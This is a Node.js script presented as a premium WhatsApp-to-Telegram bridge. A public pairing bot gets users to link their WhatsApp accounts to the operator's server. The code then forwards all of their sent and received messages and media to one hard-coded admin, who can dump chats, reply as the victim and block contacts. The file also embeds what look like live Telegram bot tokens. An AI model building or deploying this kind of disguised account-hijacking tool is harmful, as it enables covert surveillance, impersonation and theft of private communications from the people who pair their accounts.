/**
 * 👑 WHATSAPP-TELEGRAM ULTIMATE BRIDGE (2025 PREMIUM EDITION)
 * --------------------------------------------------
 * المميزات:
 * 1. ربط ذكي بنظام Pair Code (Desktop MacOS Mode).
 * 2. مزامنة كاملة (الرسائل المرسلة والمستلمة).
 * 3. دعم كامل للميديا (صور، فيديو، ملاحظات صوتية).
 * 4. لوحة تحكم فخمة لسحب المحادثات والتحكم بالحساب.
 * 5. نظام إشعارات ذكي لجهات الاتصال والحالات.
 */

const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    makeInMemoryStore,
    getContentType,
    Browsers,
    delay,
    downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const { Telegraf, Markup, session } = require("telegraf");
const pino = require("pino");
const fs = require("fs-extra");
const path = require("path");

// --- 🛠 الإعدادات المركزية ---
const CONFIG = {
    PAIRING_BOT_TOKEN: "8578288620:AAFVW35qKVRPHMmKrPacqejWlupE5OgM3qI", 
    MANAGER_BOT_TOKEN: "8584722590:AAHFV8u4XZlBPNJ0uD4bHVosXY71bP3hPA4",
    ADMIN_ID: "8510615418",
    SESSIONS_BASE_PATH: path.join(__dirname, "sessions_vault"),
    LOG_LEVEL: "silent"
};

fs.ensureDirSync(CONFIG.SESSIONS_BASE_PATH);

class WhatsAppBridge {
    constructor() {
        this.activeConnections = new Map();
        this.pairingBot = new Telegraf(CONFIG.PAIRING_BOT_TOKEN);
        this.managerBot = new Telegraf(CONFIG.MANAGER_BOT_TOKEN);
        this.store = makeInMemoryStore({ logger: pino({ level: "silent" }) });
        
        this.managerBot.use(session());
        this.init();
    }

    async init() {
        console.log("🚀 جاري تشغيل النظام الاحترافي الفخم...");
        this.setupBotHandlers();
        await this.restoreSessions();
        
        this.pairingBot.launch();
        this.managerBot.launch();
    }

    async restoreSessions() {
        const folders = await fs.readdir(CONFIG.SESSIONS_BASE_PATH);
        for (const folder of folders) {
            if (folder.startsWith("user_")) {
                const phone = folder.replace("user_", "");
                this.createWhatsAppInstance(phone);
            }
        }
    }

    async downloadMedia(msg, type) {
        const stream = await downloadContentFromMessage(msg, type);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    }

    async createWhatsAppInstance(phone, telegramCtx = null) {
        const sessionDir = path.join(CONFIG.SESSIONS_BASE_PATH, `user_${phone}`);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
            version,
            auth: state,
            logger: pino({ level: CONFIG.LOG_LEVEL }),
            browser: Browsers.macOS('Desktop'),
            printQRInTerminal: false,
            markOnlineOnConnect: true,
            syncFullHistory: true
        });

        this.store.bind(sock.ev);
        this.activeConnections.set(phone, sock);

        if (telegramCtx && !sock.authState.creds.registered) {
            await delay(3000);
            try {
                const code = await sock.requestPairingCode(phone);
                const prettyCode = code?.match(/.{1,4}/g)?.join('-') || code;
                await telegramCtx.replyWithHTML(`💎 <b>كود الربط الفخم</b>\n\nالرقم: <code>${phone}</code>\nالكود: <code>${prettyCode}</code>`);
            } catch (err) {
                await telegramCtx.reply("❌ خطأ في طلب الكود.");
            }
        }

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === 'close') {
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
                if (shouldReconnect) this.createWhatsAppInstance(phone);
            } else if (connection === 'open') {
                this.notifyAdmin(`✅ <b>تم تفعيل الجلسة!</b>\nالرقم: <code>${phone}</code>`);
            }
        });

        sock.ev.on('messages.upsert', async (m) => {
            if (m.type !== 'notify') return;
            for (const msg of m.messages) {
                if (!msg.message || msg.key.remoteJid === 'status@broadcast') continue;
                this.handleTraffic(phone, msg, sock);
            }
        });
    }

    async handleTraffic(instancePhone, msg, sock) {
        const jid = msg.key.remoteJid;
        const name = msg.pushName || "مجهول";
        const type = getContentType(msg.message);
        const fromMe = msg.key.fromMe;
        
        // جلب النص البرمجي
        let text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || msg.message[type]?.caption || "";
        
        const header = fromMe ? `📤 <b>أنت أرسلت:</b>` : `📥 <b>وصلتك رسالة:</b>`;
        const meta = `\n👤 <b>الأسم:</b> ${name}\n📱 <b>الرقم:</b> <code>${jid.split('@')[0]}</code>\n━━━━━━━\n`;
        
        const keyboard = Markup.inlineKeyboard([
            [Markup.button.callback("💬 رد", `reply:${instancePhone}:${jid}`), Markup.button.callback("📂 سحب المحادثة", `dump:${instancePhone}:${jid}`)],
            [Markup.button.callback("🚫 حظر", `block:${instancePhone}:${jid}`), Markup.button.callback("🗑 حذف", `del:${instancePhone}`)]
        ]);

        try {
            if (type === 'imageMessage') {
                const buffer = await this.downloadMedia(msg.message.imageMessage, 'image');
                await this.managerBot.telegram.sendPhoto(CONFIG.ADMIN_ID, { source: buffer }, { caption: `${header}${meta}${text}`, parse_mode: 'HTML', ...keyboard });
            } else if (type === 'videoMessage') {
                const buffer = await this.downloadMedia(msg.message.videoMessage, 'video');
                await this.managerBot.telegram.sendVideo(CONFIG.ADMIN_ID, { source: buffer }, { caption: `${header}${meta}${text}`, parse_mode: 'HTML', ...keyboard });
            } else if (type === 'audioMessage') {
                const buffer = await this.downloadMedia(msg.message.audioMessage, 'audio');
                await this.managerBot.telegram.sendVoice(CONFIG.ADMIN_ID, { source: buffer }, { caption: `${header}${meta}`, parse_mode: 'HTML', ...keyboard });
            } else {
                await this.managerBot.telegram.sendMessage(CONFIG.ADMIN_ID, `${header}${meta}${text || "[وسائط/ملصق]"}`, { parse_mode: 'HTML', ...keyboard });
            }
        } catch (e) { console.error(e); }
    }

    setupBotHandlers() {
        this.pairingBot.start(ctx => ctx.reply("👑 أهلاً بك. أرسل /pair متبوعاً برقمك."));
        this.pairingBot.command('pair', async (ctx) => {
            const phone = ctx.message.text.split(' ')[1]?.replace(/[^0-9]/g, '');
            if (!phone) return ctx.reply("❌ اكتب الرقم بشكل صحيح.");
            this.createWhatsAppInstance(phone, ctx);
        });

        this.managerBot.start(ctx => {
            if (ctx.from.id.toString() !== CONFIG.ADMIN_ID) return;
            ctx.reply("🛠 لوحة التحكم الفخمة جاهزة.", Markup.keyboard([['📊 الحالة', '📱 الأرقام المتصلة'], ['⚙️ الإعدادات']]).resize());
        });

        // سحب كامل المحادثة (Dumping)
        this.managerBot.action(/dump:(.*):(.*)/, async (ctx) => {
            const [_, phone, jid] = ctx.match;
            await ctx.answerCbQuery("جاري سحب المحادثة... 📂");
            
            // محاكاة سحب المحادثة من الـ Store
            const messages = this.store.messages[jid]?.array || [];
            let report = `📂 <b>سجل المحادثة لـ ${jid.split('@')[0]}:</b>\n\n`;
            
            messages.slice(-15).forEach(m => {
                const mType = getContentType(m.message);
                const mText = m.message?.conversation || m.message?.extendedTextMessage?.text || "[وسائط]";
                report += `${m.key.fromMe ? '🟢' : '⚪️'} ${mText}\n`;
            });

            ctx.replyWithHTML(report);
        });

        this.managerBot.action(/reply:(.*):(.*)/, async (ctx) => {
            const [_, phone, jid] = ctx.match;
            ctx.session = { activeReply: { phone, jid } };
            ctx.replyWithHTML(`⌨️ أرسل رسالتك للرد على <code>${jid.split('@')[0]}</code>:`);
        });

        this.managerBot.on('text', async (ctx) => {
            if (ctx.from.id.toString() !== CONFIG.ADMIN_ID) return;
            if (ctx.session?.activeReply) {
                const { phone, jid } = ctx.session.activeReply;
                const sock = this.activeConnections.get(phone);
                await sock.sendMessage(jid, { text: ctx.message.text });
                ctx.reply("✅ تم الإرسال بنجاح.");
                ctx.session = null;
            }
        });
    }

    notifyAdmin(text) {
        this.managerBot.telegram.sendMessage(CONFIG.ADMIN_ID, text, { parse_mode: 'HTML' }).catch(() => {});
    }
}

new WhatsAppBridge();

